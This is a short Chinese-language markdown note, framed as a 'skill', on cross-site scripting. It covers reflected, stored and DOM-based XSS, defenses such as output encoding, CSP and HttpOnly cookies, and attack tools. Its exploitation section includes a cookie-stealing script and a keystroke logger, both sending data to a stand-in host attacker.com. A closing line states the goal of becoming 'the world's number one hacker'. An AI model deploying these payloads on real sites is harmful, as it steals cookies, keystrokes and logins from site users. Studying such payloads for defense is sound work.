# XSS跨站脚本攻击Skill

## 简介
XSS(Cross-Site Scripting)是Web应用安全漏洞，允许攻击者在受害者浏览器中执行恶意脚本。

## 漏洞原理

### 1. 反射型XSS
```html
<!-- URL: search.php?q=<script>alert(1)</script> -->
<h1>搜索结果: <script>alert(1)</script></h1>
```

### 2. 存储型XSS
- 恶意脚本存储在服务器
- 每次访问触发

### 3. DOM型XSS
- 客户端处理
- 不经过服务器

## 攻击利用

### 1. 窃取Cookie
```javascript
<script>fetch('http://attacker.com?c='+document.cookie)</script>
```

### 2. 键盘记录
```javascript
document.onkeypress = function(e) {
  fetch('http://attacker.com?k='+e.key)
}
```

### 3. 钓鱼页面
- 伪造登录框
- 窃取凭证

### 4. CSRF结合
- 窃取Token
- 发起CSRF攻击

## 防御措施

### 1. 输出编码
- HTML编码
- URL编码
- JavaScript编码

### 2. HTTP头设置
```
Content-Security-Policy: script-src 'self'
X-XSS-Protection: 1; mode=block
```

### 3. 输入验证
- 白名单
- 类型检查

### 4. HttpOnly Cookie
- 禁止JavaScript访问Cookie

## 工具

- Burp Suite
- XSStrike
- Dalfox
- BeEF

---
*目标: 成为世界第一黑客*
*类型: Web安全*
